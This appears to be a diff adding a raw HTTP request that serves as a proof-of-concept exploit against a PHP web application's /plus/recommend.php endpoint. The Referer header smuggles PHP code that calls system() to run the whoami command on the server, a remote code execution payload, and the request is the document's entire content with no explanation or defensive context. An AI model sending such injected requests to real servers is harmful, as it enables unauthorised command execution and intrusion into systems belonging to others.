@@ -1,0 +1,5 @@
+GET /plus/recommend.php HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0
+Referer: <?php "system"(whoami);die;/*
+Connection: close
